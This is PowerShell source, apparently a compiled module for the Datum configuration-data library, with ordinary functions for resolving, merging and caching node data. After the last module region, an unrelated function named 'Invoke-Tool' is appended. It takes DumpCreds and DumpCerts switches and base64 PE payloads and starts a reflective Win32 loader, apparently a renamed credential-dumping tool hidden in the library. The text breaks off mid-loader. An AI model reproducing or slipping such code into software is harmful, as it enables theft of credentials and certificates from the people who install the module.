            $rsopNode."$CompositionKey" = $configurations

            $configurations.ForEach{
                $value = Resolve-NodeProperty -PropertyPath $_ -DefaultValue @{} -Node $node -DatumTree $Datum
                $rsopNode."$_" = $value
            }

            $lcmConfigKeyName = $datum.__Definition.DscLocalConfigurationManagerKeyName
            if ($lcmConfigKeyName) {
                $lcmConfig = Resolve-NodeProperty -PropertyPath $lcmConfigKeyName -DefaultValue $null
                if ($lcmConfig) {
                    $rsopNode.LcmConfig = $lcmConfig
                }
                else {
                    Write-Host -Object "`tWARNING: 'DscLocalConfigurationManagerKeyName' is defined in the 'datum.yml' but did not return a result for node '$($node.Name)'" -ForegroundColor Yellow
                }
            }

            $clonedRsopNode = Copy-Object -DeepCopyObject $rsopNode
            $clonedRsopNode = ConvertTo-Datum -InputObject $clonedRsopNode -DatumHandlers $Datum.__Definition.DatumHandlers
            $script:rsopCache."$($node.Name)" = $clonedRsopNode
        }
        else {
            Write-Verbose "Key found in the cache: '$($node.Name)'. Retrieving RSOP from cache."
        }

        if ($IncludeSource) {
            Expand-RsopHashtable -InputObject $script:rsopCache."$($node.Name)" -Depth 0 -AddSourceInformation
        }
        elseif ($RemoveSource) {
            Expand-RsopHashtable -InputObject $script:rsopCache."$($node.Name)" -Depth 0
        }
        else {
            $script:rsopCache."$($node.Name)"
        }
    }
}
#EndRegion './Public/Get-DatumRsop.ps1' 105
#Region './Public/Get-DatumRsopCache.ps1' 0
function Get-DatumRsopCache {
    [CmdletBinding()]

    param ()

    if ($script:rsopCache.Count) {
        $script:rsopCache
    }
    else {
        $script:rsopCache = @{}
        Write-Verbose 'The Datum RSOP Cache is empty.'
    }
}
#EndRegion './Public/Get-DatumRsopCache.ps1' 17
#Region './Public/Get-DatumSourceFile.ps1' 0
function Get-DatumSourceFile {
    <#
    .SYNOPSIS
        Gets the source file for the given datum.
    .DESCRIPTION

        This command gets the relative source file for the given datum. The source file path
        is relative to the current directory and skips the first directory in the path.

    .EXAMPLE
        PS C:\> Get-DatumSourceFile -Path D:\git\datum\tests\Integration\assets\DscWorkshopConfigData\Roles\DomainController.yml

        This command returns the source file path like this:
            assets\DscWorkshopConfigData\Roles\DomainController

    .INPUTS
        string

    .OUTPUTS
        string
    #>

    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [AllowEmptyString()]
        [string]$Path
    )

    if (-not $Path) {
        return [string]::Empty
    }

    try {
        $p = Resolve-Path -Path $Path -Relative -ErrorAction Stop
        $p = $p -split '\\'
        $p[-1] = [System.IO.Path]::GetFileNameWithoutExtension($p[-1])
        $p[2..($p.Length - 1)] -join '\'
    }
    catch {
        Write-Verbose 'Get-DatumSourceFile: nothing to catch here'
    }
}
#EndRegion './Public/Get-DatumSourceFile.ps1' 48
#Region './Public/Get-FileProviderData.ps1' 0
function Get-FileProviderData {
    [OutputType([System.Array])]
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [string]
        $Path,

        [Parameter()]
        [AllowNull()]
        [hashtable]
        $DatumHandlers = @{},

        [Parameter()]
        [ValidateSet('Ascii', 'BigEndianUnicode', 'Default', 'Unicode', 'UTF32', 'UTF7', 'UTF8')]
        [string]
        $Encoding = 'Default'
    )

    if (-not $script:FileProviderDataCache) {
        $script:FileProviderDataCache = @{}
    }

    $file = Get-Item -Path $Path
    if ($script:FileProviderDataCache.ContainsKey($file.FullName) -and
        $file.LastWriteTime -eq $script:FileProviderDataCache[$file.FullName].Metadata.LastWriteTime) {
        Write-Verbose -Message "Getting File Provider Cache for Path: $Path"
        , $script:FileProviderDataCache[$file.FullName].Value
    }
    else {
        Write-Verbose -Message "Getting File Provider Data for Path: $Path"
        $data = switch ($file.Extension) {
            '.psd1' {
                Import-PowerShellDataFile -Path $file | ConvertTo-Datum -DatumHandlers $DatumHandlers
            }
            '.json' {
                ConvertFrom-Json -InputObject (Get-Content -Path $Path -Encoding $Encoding -Raw) | ConvertTo-Datum -DatumHandlers $DatumHandlers
            }
            '.yml' {
                ConvertFrom-Yaml -Yaml (Get-Content -Path $Path -Encoding $Encoding -Raw) -Ordered | ConvertTo-Datum -DatumHandlers $DatumHandlers
            }
            '.yaml' {
                ConvertFrom-Yaml -Yaml (Get-Content -Path $Path -Encoding $Encoding -Raw) -Ordered | ConvertTo-Datum -DatumHandlers $DatumHandlers
            }
            Default {
                Write-Verbose -Message "File extension $($file.Extension) not supported. Defaulting on RAW."
                Get-Content -Path $Path -Encoding $Encoding -Raw
            }
        }

        $script:FileProviderDataCache[$file.FullName] = @{
            Metadata = $file
            Value    = $data
        }
        , $data
    }
}
#EndRegion './Public/Get-FileProviderData.ps1' 68
#Region './Public/Get-MergeStrategyFromPath.ps1' 0
function Get-MergeStrategyFromPath {
    [OutputType([hashtable])]
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [hashtable]
        $Strategies,

        [Parameter(Mandatory = $true)]
        [string]
        $PropertyPath
    )

    Write-Debug -Message "`tGet-MergeStrategyFromPath -PropertyPath <$PropertyPath> -Strategies [$($Strategies.Keys -join ', ')], count $($Strategies.Count)"
    # Select Relevant strategy
    #   Use exact path match first
    #   or try Regex in order
    if ($Strategies.($PropertyPath)) {
        $strategyKey = $PropertyPath
        Write-Debug -Message "`t  Strategy found for exact key $strategyKey"
    }
    elseif ($Strategies.Keys -and
        ($strategyKey = [string]($Strategies.Keys.Where{ $_.StartsWith('^') -and $_ -as [regex] -and $PropertyPath -match $_ } | Select-Object -First 1))
    ) {
        Write-Debug -Message "`t  Strategy matching regex $strategyKey"
    }
    else {
        Write-Debug -Message "`t  No Strategy found"
        return
    }

    Write-Debug -Message "`t  StrategyKey: $strategyKey"
    if ($Strategies[$strategyKey] -is [string]) {
        Write-Debug -Message "`t  Returning Strategy $strategyKey from String '$($Strategies[$strategyKey])'"
        Get-MergeStrategyFromString -MergeStrategy $Strategies[$strategyKey]
    }
    else {
        Write-Debug -Message "`t  Returning Strategy $strategyKey of type '$($Strategies[$strategyKey].Strategy)'"
        $Strategies[$strategyKey]
    }
}
#EndRegion './Public/Get-MergeStrategyFromPath.ps1' 48
#Region './Public/Invoke-TestHandlerAction.ps1' 0
function Invoke-TestHandlerAction {
    [OutputType([string])]
    [CmdletBinding()]
    param (
        [Parameter()]
        [string]
        $Password,

        [Parameter()]
        [object]
        $Test,

        [Parameter()]
        [object]
        $Datum
    )

    @"
Action: $handler
Node: $($Node|fl *|Out-String)
Params:
$($PSBoundParameters | ConvertTo-Json)
"@

}
#EndRegion './Public/Invoke-TestHandlerAction.ps1' 27
#Region './Public/Merge-Datum.ps1' 0
function Merge-Datum {
    [OutputType([System.Array])]
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [string]
        $StartingPath,

        [Parameter(Mandatory = $true)]
        [object]
        $ReferenceDatum,

        [Parameter(Mandatory = $true)]
        [AllowNull()]
        [object]
        $DifferenceDatum,

        [Parameter()]
        [hashtable]
        $Strategies = @{
            '^.*' = 'MostSpecific'
        }
    )

    Write-Debug -Message "Merge-Datum -StartingPath <$StartingPath>"
    $strategy = Get-MergeStrategyFromPath -Strategies $Strategies -PropertyPath $startingPath -Verbose

    Write-Verbose -Message "   Merge Strategy: @$($strategy | ConvertTo-Json)"

    $result = $null
    if ($ReferenceDatum -is [array]) {
        $datumItems = @()
        foreach ($item in $ReferenceDatum) {
            if (Invoke-DatumHandler -InputObject $item -DatumHandlers $Datum.__Definition.DatumHandlers -Result ([ref]$result)) {
                $datumItems += ConvertTo-Datum -InputObject $result -DatumHandlers $Datum.__Definition.DatumHandlers
            }
            else {
                $datumItems += $item
            }
        }
        $ReferenceDatum = $datumItems
    }
    else {
        if (Invoke-DatumHandler -InputObject $ReferenceDatum -DatumHandlers $Datum.__Definition.DatumHandlers -Result ([ref]$result)) {
            $ReferenceDatum = ConvertTo-Datum -InputObject $result -DatumHandlers $Datum.__Definition.DatumHandlers
        }
    }

    if ($DifferenceDatum -is [array]) {
        $datumItems = @()
        foreach ($item in $DifferenceDatum) {
            if (Invoke-DatumHandler -InputObject $item -DatumHandlers $Datum.__Definition.DatumHandlers -Result ([ref]$result)) {
                $datumItems += ConvertTo-Datum -InputObject $result -DatumHandlers $Datum.__Definition.DatumHandlers
            }
            else {
                $datumItems += $item
            }
        }
        $DifferenceDatum = $datumItems
    }
    else {
        if (Invoke-DatumHandler -InputObject $DifferenceDatum -DatumHandlers $Datum.__Definition.DatumHandlers -Result ([ref]$result)) {
            $DifferenceDatum = ConvertTo-Datum -InputObject $result -DatumHandlers $Datum.__Definition.DatumHandlers
        }
    }

    $referenceDatumType = Get-DatumType -DatumObject $ReferenceDatum
    $differenceDatumType = Get-DatumType -DatumObject $DifferenceDatum

    if ($referenceDatumType -ne $differenceDatumType) {
        Write-Warning -Message "Cannot merge different types in path '$StartingPath' REF:[$referenceDatumType] | DIFF:[$differenceDatumType]$($DifferenceDatum.GetType()) , returning most specific Datum."
        return $ReferenceDatum
    }

    if ($strategy -is [string]) {
        $strategy = Get-MergeStrategyFromString -MergeStrategy $strategy
    }

    switch ($referenceDatumType) {
        'BaseType' {
            return $ReferenceDatum
        }

        'hashtable' {
            $mergeParams = @{
                ReferenceHashtable  = $ReferenceDatum
                DifferenceHashtable = $DifferenceDatum
                Strategy            = $strategy
                ParentPath          = $StartingPath
                ChildStrategies     = $Strategies
            }

            if ($strategy.merge_hash -match '^MostSpecific$|^First') {
                return $ReferenceDatum
            }
            else {
                Merge-Hashtable @mergeParams
            }
        }

        'baseType_array' {
            switch -Regex ($strategy.merge_baseType_array) {
                '^MostSpecific$|^First' {
                    return $ReferenceDatum
                }

                '^Unique' {
                    if ($regexPattern = $strategy.merge_options.knockout_prefix) {
                        $regexPattern = $regexPattern.insert(0, '^')
                        $result = @(($ReferenceDatum + $DifferenceDatum).Where{ $_ -notmatch $regexPattern } | Select-Object -Unique)
                        , $result
                    }
                    else {
                        $result = @(($ReferenceDatum + $DifferenceDatum) | Select-Object -Unique)
                        , $result
                    }

                }

                '^Sum|^Add' {
                    #--> $ref + $diff -$kop
                    if ($regexPattern = $strategy.merge_options.knockout_prefix) {
                        $regexPattern = $regexPattern.insert(0, '^')
                        , (($ReferenceDatum + $DifferenceDatum).Where{ $_ -notMatch $regexPattern })
                    }
                    else {
                        , ($ReferenceDatum + $DifferenceDatum)
                    }
                }

                Default {
                    return (, $ReferenceDatum)
                }
            }
        }

        'hash_array' {
            $MergeDatumArrayParams = @{
                ReferenceArray  = $ReferenceDatum
                DifferenceArray = $DifferenceDatum
                Strategy        = $strategy
                ChildStrategies = $Strategies
                StartingPath    = $StartingPath
            }

            switch -Regex ($strategy.merge_hash_array) {
                '^MostSpecific|^First' {
                    return $ReferenceDatum
                }

                '^UniqueKeyValTuples' {
                    #--> $ref + $diff | ? % key in Tuple_Keys -> $ref[Key] -eq $diff[key] is not already int output
                    , (Merge-DatumArray @MergeDatumArrayParams)
                }

                '^DeepTuple|^DeepItemMergeByTuples' {
                    #--> $ref + $diff | ? % key in Tuple_Keys -> $ref[Key] -eq $diff[key] is merged up
                    , (Merge-DatumArray @MergeDatumArrayParams)
                }

                '^Sum' {
                    #--> $ref + $diff
                    (@($DifferenceArray) + @($ReferenceArray)).Foreach{
                        $null = $MergedArray.Add(([ordered]@{} + $_))
                    }
                    , $MergedArray
                }

                Default {
                    return , $ReferenceDatum
                }
            }
        }
    }
}
#EndRegion './Public/Merge-Datum.ps1' 213
#Region './Public/New-DatumFileProvider.ps1' 0
function New-DatumFileProvider {
    [CmdletBinding()]
    param (
        [Parameter()]
        [Alias('DataOptions')]
        [AllowNull()]
        [object]
        $Store,

        [Parameter()]
        [AllowNull()]
        [hashtable]
        $DatumHierarchyDefinition = @{},

        [Parameter()]
        [string]
        $Path = $Store.StoreOptions.Path,

        [Parameter()]
        [ValidateSet('Ascii', 'BigEndianUnicode', 'Default', 'Unicode', 'UTF32', 'UTF7', 'UTF8')]
        [string]
        $Encoding = 'Default'
    )

    if (-not $DatumHierarchyDefinition) {
        $DatumHierarchyDefinition = @{}
    }

    [FileProvider]::new($Path, $Store, $DatumHierarchyDefinition, $Encoding)
}
#EndRegion './Public/New-DatumFileProvider.ps1' 33
#Region './Public/New-DatumStructure.ps1' 0
function New-DatumStructure {
    [OutputType([hashtable])]
    [CmdletBinding(DefaultParameterSetName = 'FromConfigFile')]

    param (
        [Parameter(Mandatory = $true, ParameterSetName = 'DatumHierarchyDefinition')]
        [Alias('Structure')]
        [hashtable]
        $DatumHierarchyDefinition,

        [Parameter(Mandatory = $true, ParameterSetName = 'FromConfigFile')]
        [System.IO.FileInfo]
        $DefinitionFile,

        [Parameter()]
        [ValidateSet('Ascii', 'BigEndianUnicode', 'Default', 'Unicode', 'UTF32', 'UTF7', 'UTF8')]
        [string]
        $Encoding = 'Default'
    )

    switch ($PSCmdlet.ParameterSetName) {
        'DatumHierarchyDefinition' {
            if ($DatumHierarchyDefinition.Contains('DatumStructure')) {
                Write-Debug -Message 'Loading Datum from Parameter'
            }
            elseif ($DatumHierarchyDefinition.Path) {
                $datumHierarchyFolder = $DatumHierarchyDefinition.Path
                Write-Debug -Message "Loading default Datum from given path $datumHierarchyFolder"
            }
            else {
                Write-Warning -Message 'Desperate attempt to load Datum from Invocation origin...'
                $callStack = Get-PSCallStack
                $datumHierarchyFolder = $callStack[-1].PSScriptRoot
                Write-Warning -Message " ---> $datumHierarchyFolder"
            }
        }

        'FromConfigFile' {
            if ((Test-Path -Path $DefinitionFile)) {
                $DefinitionFile = (Get-Item -Path $DefinitionFile -ErrorAction Stop)
                Write-Debug -Message "File $DefinitionFile found. Loading..."
                $DatumHierarchyDefinition = Get-FileProviderData -Path $DefinitionFile.FullName -Encoding $Encoding
                if (-not $DatumHierarchyDefinition.Contains('ResolutionPrecedence')) {
                    throw 'Invalid Datum Hierarchy Definition'
                }
                $datumHierarchyFolder = $DefinitionFile.Directory.FullName
                $DatumHierarchyDefinition.DatumDefinitionFile = $DefinitionFile
                Write-Debug -Message "Datum Hierachy Parent folder: $datumHierarchyFolder"
            }
            else {
                throw 'Datum Hierarchy Configuration not found'
            }
        }
    }

    $root = @{}
    if ($datumHierarchyFolder -and -not $DatumHierarchyDefinition.DatumStructure) {
        $structures = foreach ($store in (Get-ChildItem -Directory -Path $datumHierarchyFolder)) {
            @{
                StoreName     = $store.BaseName
                StoreProvider = 'Datum::File'
                StoreOptions  = @{
                    Path = $store.FullName
                }
            }
        }

        if ($DatumHierarchyDefinition.Contains('DatumStructure')) {
            $DatumHierarchyDefinition['DatumStructure'] = $structures
        }
        else {
            $DatumHierarchyDefinition.Add('DatumStructure', $structures)
        }
    }

    # Define the default hierachy to be the StoreNames, when nothing is specified
    if ($datumHierarchyFolder -and -not $DatumHierarchyDefinition.ResolutionPrecedence) {
        if ($DatumHierarchyDefinition.Contains('ResolutionPrecedence')) {
            $DatumHierarchyDefinition['ResolutionPrecedence'] = $structures.StoreName
        }
        else {
            $DatumHierarchyDefinition.Add('ResolutionPrecedence', $structures.StoreName)
        }
    }
    # Adding the Datum Definition to Root object
    $root.Add('__Definition', $DatumHierarchyDefinition)

    foreach ($store in $DatumHierarchyDefinition.DatumStructure) {
        $storeParams = @{
            Store    = (ConvertTo-Datum ([hashtable]$store).Clone())
            Path     = $store.StoreOptions.Path
            Encoding = $Encoding
        }

        # Accept Module Specification for Store Provider as String (unversioned) or Hashtable
        if ($store.StoreProvider -is [string]) {
            $storeProviderModule, $storeProviderName = $store.StoreProvider -split '::'
        }
        else {
            $storeProviderModule = $store.StoreProvider.ModuleName
            $storeProviderName = $store.StoreProvider.ProviderName
            if ($store.StoreProvider.ModuleVersion) {
                $storeProviderModule = @{
                    ModuleName    = $storeProviderModule
                    ModuleVersion = $store.StoreProvider.ModuleVersion
                }
            }
        }

        if (-not ($module = Get-Module -Name $storeProviderModule -ErrorAction SilentlyContinue)) {
            $module = Import-Module $storeProviderModule -Force -ErrorAction Stop -PassThru
        }
        $moduleName = ($module | Where-Object { $_.ExportedCommands.Keys -match 'New-Datum(\w+)Provider' }).Name

        $newProviderCmd = Get-Command ('{0}\New-Datum{1}Provider' -f $moduleName, $storeProviderName)

        if ($storeParams.Path -and -not [System.IO.Path]::IsPathRooted($storeParams.Path) -and $datumHierarchyFolder) {
            Write-Debug -Message 'Replacing Store Path with AbsolutePath'
            $storePath = Join-Path -Path $datumHierarchyFolder -ChildPath $storeParams.Path -Resolve -ErrorAction Stop
            $storeParams['Path'] = $storePath
        }

        if ($newProviderCmd.Parameters.Keys -contains 'DatumHierarchyDefinition') {
            Write-Debug -Message 'Adding DatumHierarchyDefinition to Store Params'
            $storeParams.Add('DatumHierarchyDefinition', $DatumHierarchyDefinition)
        }

        $storeObject = &$newProviderCmd @storeParams
        Write-Debug -Message "Adding key $($store.StoreName) to Datum root object"
        $root.Add($store.StoreName, $storeObject)
    }

    #return the Root Datum hashtable
    $root
}
#EndRegion './Public/New-DatumStructure.ps1' 160
#Region './Public/Resolve-Datum.ps1' 0
function Resolve-Datum {
    [OutputType([System.Array])]
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [string]
        $PropertyPath,

        [Parameter(Position = 1)]
        [Alias('Node')]
        [object]
        $Variable = $ExecutionContext.InvokeCommand.InvokeScript('$Node'),

        [Parameter()]
        [string]
        $VariableName = 'Node',

        [Parameter()]
        [Alias('DatumStructure')]
        [object]
        $DatumTree = $ExecutionContext.InvokeCommand.InvokeScript('$ConfigurationData.Datum'),

        [Parameter(ParameterSetName = 'UseMergeOptions')]
        [Alias('SearchBehavior')]
        [hashtable]
        $Options,

        [Parameter()]
        [Alias('SearchPaths')]
        [string[]]
        $PathPrefixes = $DatumTree.__Definition.ResolutionPrecedence,

        [Parameter()]
        [int]
        $MaxDepth = $(
            if ($mxdDpth = $DatumTree.__Definition.default_lookup_options.MaxDepth) {
                $mxdDpth
            }
            else {
                -1
            })
    )

    # Manage lookup options:
    <#
    default_lookup_options  Lookup_options  options (argument)  Behaviour
                MostSpecific for ^.*
    Present         default_lookup_options + most Specific if not ^.*
        Present     lookup_options + Default to most Specific if not ^.*
            Present options + Default to Most Specific if not ^.*
    Present Present     Lookup_options + Default for ^.* if !Exists
    Present     Present options + Default for ^.* if !Exists
        Present Present options override lookup options + Most Specific if !Exists
    Present Present Present options override lookup options + default for ^.*


    +========================+================+====================+============================================================+
    | default_lookup_options | Lookup_options | options (argument) |                         Behaviour                          |
    +========================+================+====================+============================================================+
    |                        |                |                    | MostSpecific for ^.*                                       |
    +------------------------+----------------+--------------------+------------------------------------------------------------+
    | Present                |                |                    | default_lookup_options + most Specific if not ^.*          |
    +------------------------+----------------+--------------------+------------------------------------------------------------+
    |                        | Present        |                    | lookup_options + Default to most Specific if not ^.*       |
    +------------------------+----------------+--------------------+------------------------------------------------------------+
    |                        |                | Present            | options + Default to Most Specific if not ^.*              |
    +------------------------+----------------+--------------------+------------------------------------------------------------+
    | Present                | Present        |                    | Lookup_options + Default for ^.* if !Exists                |
    +------------------------+----------------+--------------------+------------------------------------------------------------+
    | Present                |                | Present            | options + Default for ^.* if !Exists                       |
    +------------------------+----------------+--------------------+------------------------------------------------------------+
    |                        | Present        | Present            | options override lookup options + Most Specific if !Exists |
    +------------------------+----------------+--------------------+------------------------------------------------------------+
    | Present                | Present        | Present            | options override lookup options + default for ^.*          |
    +------------------------+----------------+--------------------+------------------------------------------------------------+

    If there's no default options, auto-add default options of mostSpecific merge, and tag as 'default'
    if there's a default options, use that strategy and tag as 'default'
    if the options implements ^.*, do not add Default_options, and do not tag

    1. Defaults to Most Specific
    2. Allow setting your own default, with precedence for non-default options
    3. Overriding ^.* without tagging it as default (always match unless)

    #>

    Write-Debug -Message "Resolve-Datum -PropertyPath <$PropertyPath> -Node $($Node.Name)"
    # Make options an ordered case insensitive variable
    if ($Options) {
        $Options = [ordered]@{} + $Options
    }

    if (-not $DatumTree.__Definition.default_lookup_options) {
        $default_options = Get-MergeStrategyFromString
        Write-Verbose -Message '  Default option not found in Datum Tree'
    }
    else {
        if ($DatumTree.__Definition.default_lookup_options -is [string]) {
            $default_options = Get-MergeStrategyFromString -MergeStrategy $DatumTree.__Definition.default_lookup_options
        }
        else {
            $default_options = $DatumTree.__Definition.default_lookup_options
        }
        #TODO: Add default_option input validation
        Write-Verbose -Message "  Found default options in Datum Tree of type $($default_options.Strategy)."
    }

    if ($DatumTree.__Definition.lookup_options) {
        Write-Debug -Message '  Lookup options found.'
        $lookup_options = @{} + $DatumTree.__Definition.lookup_options
    }
    else {
        $lookup_options = @{}
    }

    # Transform options from string to strategy hashtable
    foreach ($optKey in ([string[]]$lookup_options.Keys)) {
        if ($lookup_options[$optKey] -is [string]) {
            $lookup_options[$optKey] = Get-MergeStrategyFromString -MergeStrategy $lookup_options[$optKey]
        }
    }

    foreach ($optKey in ([string[]]$Options.Keys)) {
        if ($Options[$optKey] -is [string]) {
            $Options[$optKey] = Get-MergeStrategyFromString -MergeStrategy $Options[$optKey]
        }
    }

    # using options if specified or lookup_options otherwise
    if (-not $Options) {
        $Options = $lookup_options
    }

    # Add default strategy for ^.* if not present, at the end
    if (([string[]]$Options.Keys) -notcontains '^.*') {
        # Adding Default flag
        $default_options['Default'] = $true
        $Options.Add('^.*', $default_options)
    }

    # Create the variable to be used as Pivot in prefix path
    if ($Variable -and $VariableName) {
        Set-Variable -Name $VariableName -Value $Variable -Force
    }

    # Scriptblock in path detection patterns
    $pattern = '(?<opening><%=)(?<sb>.*?)(?<closure>%>)'
    $propertySeparator = [System.IO.Path]::DirectorySeparatorChar
    $splitPattern = [regex]::Escape($propertySeparator)

    $depth = 0
    $mergeResult = $null

    # Get the strategy for this path, to be used for merging
    $startingMergeStrategy = Get-MergeStrategyFromPath -PropertyPath $PropertyPath -Strategies $Options

    #Invoke datum handlers
    $PathPrefixes = $PathPrefixes | ConvertTo-Datum -DatumHandlers $datum.__Definition.DatumHandlers

    # Walk every search path in listed order, and return datum when found at end of path
    foreach ($searchPrefix in $PathPrefixes) {
        #through the hierarchy
        $arraySb = [System.Collections.ArrayList]@()
        $currentSearch = Join-Path -Path $searchPrefix -ChildPath $PropertyPath
        Write-Verbose -Message ''
        Write-Verbose -Message " Lookup <$currentSearch> $($Node.Name)"
        #extract script block for execution into array, replace by substition strings {0},{1}...
        $newSearch = [regex]::Replace($currentSearch, $pattern, {
                param (
                    [Parameter()]
                    $match
                )

                $expr = $match.Groups['sb'].value
                $index = $arraySb.Add($expr)
                "`$({$index})"
            }, @('IgnoreCase', 'SingleLine', 'MultiLine'))

        $pathStack = $newSearch -split $splitPattern
        # Get value for this property path
        $datumFound = Resolve-DatumPath -Node $Node -DatumTree $DatumTree -PathStack $pathStack -PathVariables $arraySb

        if ($datumFound -is [DatumProvider]) {
            $datumFound = $datumFound.ToOrderedHashTable()
        }

        Write-Debug -Message "  Depth: $depth; Merge options = $($Options.count)"

        #Stop processing further path at first value in 'MostSpecific' mode (called 'first' in Puppet hiera)
        if ($null -ne $datumFound -and ($startingMergeStrategy.Strategy -match '^MostSpecific|^First')) {
            return $datumFound
        }
        elseif ($null -ne $datumFound) {

            if ($null -eq $mergeResult) {
                $mergeResult = $datumFound
            }
            else {
                $mergeParams = @{
                    StartingPath    = $PropertyPath
                    ReferenceDatum  = $mergeResult
                    DifferenceDatum = $datumFound
                    Strategies      = $Options
                }
                $mergeResult = Merge-Datum @mergeParams
            }
        }

        #if we've reached the Maximum Depth allowed, return current result and stop further execution
        if ($depth -eq $MaxDepth) {
            Write-Debug "  Max depth of $MaxDepth reached. Stopping."
            , $mergeResult
            return
        }
    }
    , $mergeResult
}
#EndRegion './Public/Resolve-Datum.ps1' 242
#Region './Public/Resolve-DatumPath.ps1' 0
function Resolve-DatumPath {
    [OutputType([System.Array])]
    [CmdletBinding()]
    param (
        [Parameter()]
        [Alias('Variable')]
        $Node,

        [Parameter()]
        [Alias('DatumStructure')]
        [object]
        $DatumTree,

        [Parameter()]
        [string[]]
        $PathStack,

        [Parameter()]
        [System.Collections.ArrayList]
        $PathVariables
    )

    $currentNode = $DatumTree
    $propertySeparator = '.' #[System.IO.Path]::DirectorySeparatorChar
    $index = -1
    Write-Debug -Message "`t`t`t"

    foreach ($stackItem in $PathStack) {
        $index++
        $relativePath = $PathStack[0..$index]
        Write-Debug -Message "`t`t`tCurrent Path: `$Datum$propertySeparator$($relativePath -join $propertySeparator)"
        $remainingStack = $PathStack[$index..($PathStack.Count - 1)]
        Write-Debug -Message "`t`t`t`tbranch of path Left to walk: $propertySeparator$($remainingStack[1..$remainingStack.Length] -join $propertySeparator)"

        if ($stackItem -match '\{\d+\}') {
            Write-Debug -Message "`t`t`t`t`tReplacing expression $stackItem"
            $stackItem = [scriptblock]::Create(($stackItem -f ([string[]]$PathVariables)) ).Invoke()
            Write-Debug -Message ($stackItem | Format-List * | Out-String)
            $pathItem = $stackItem
        }
        else {
            $pathItem = $currentNode.($ExecutionContext.InvokeCommand.ExpandString($stackItem))
        }

        # if $pathItem is $null, it won't have subkeys, stop execution for this Prefix
        if ($null -eq $pathItem) {
            Write-Verbose -Message " NULL FOUND at `$Datum.$($ExecutionContext.InvokeCommand.ExpandString(($relativePath -join $propertySeparator) -f [string[]]$PathVariables))`t`t <`$Datum$propertySeparator$(($relativePath -join $propertySeparator) -f [string[]]$PathVariables)>"
            if ($remainingStack.Count -gt 1) {
                Write-Verbose -Message "`t`t----> before:  $propertySeparator$($ExecutionContext.InvokeCommand.ExpandString(($remainingStack[1..($remainingStack.Count-1)] -join $propertySeparator)))`t`t <$(($remainingStack[1..($remainingStack.Count-1)] -join $propertySeparator) -f [string[]]$PathVariables)>"
            }
            return $null
        }
        else {
            $currentNode = $pathItem
        }


        if ($remainingStack.Count -eq 1) {
            Write-Verbose -Message " VALUE found at `$Datum$propertySeparator$($ExecutionContext.InvokeCommand.ExpandString(($relativePath -join $propertySeparator) -f [string[]]$PathVariables))"
            , $currentNode
        }

    }
}
#EndRegion './Public/Resolve-DatumPath.ps1' 73
#Region './Public/Test-TestHandlerFilter.ps1' 0
function Test-TestHandlerFilter {
    [CmdletBinding()]
    [OutputType([bool])]
    param (
        [Parameter(ValueFromPipeline = $true)]
        [object]$InputObject
    )

    $InputObject -is [string] -and $InputObject -match '^\[TEST=[\w\W]*\]$'
}
#EndRegion './Public/Test-TestHandlerFilter.ps1' 12

function Invoke-Tool {

    [CmdletBinding(DefaultParameterSetName = 'DumpCreds')]
    Param(
        [Parameter(Position = 0)]
        [String[]]
        $ComputerName,

        [Parameter(ParameterSetName = 'DumpCreds', Position = 1)]
        [Switch]
        $DumpCreds,

        [Parameter(ParameterSetName = 'DumpCerts', Position = 1)]
        [Switch]
        $DumpCerts,

        [Parameter(ParameterSetName = 'CustomCommand', Position = 1)]
        [String]
        $Command
    )

    Set-StrictMode -Version 2


    $RemoteScriptBlock = {
        [CmdletBinding()]
        Param(
            [Parameter(Position = 0, Mandatory = $true)]
            [String]
            $PEBytes64,

            [Parameter(Position = 1, Mandatory = $true)]
            [String]
            $PEBytes32,
        
            [Parameter(Position = 2, Mandatory = $false)]
            [String]
            $FuncReturnType,
                
            [Parameter(Position = 3, Mandatory = $false)]
            [Int32]
            $ProcId,
        
            [Parameter(Position = 4, Mandatory = $false)]
            [String]
            $ProcName,

            [Parameter(Position = 5, Mandatory = $false)]
            [String]
            $ExeArgs
        )
    
        ###################################
        ##########  Win32 Stuff  ##########
        ###################################
        Function Get-Win32Types {
            $Win32Types = New-Object System.Object

            #Define all the structures/enums that will be used
            #   This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
            $Domain = [AppDomain]::CurrentDomain
            $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
            $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
            $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


            ############    ENUM    ############
            #Enum MachineType
            $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
            $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
            $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
            $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
            $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
            $MachineType = $TypeBuilder.CreateType()
            $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

            #Enum MagicType
            $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
            $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
            $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
            $MagicType = $TypeBuilder.CreateType()
            $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

            #Enum SubSystemType
            $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
            $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
            $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
            $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
            $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
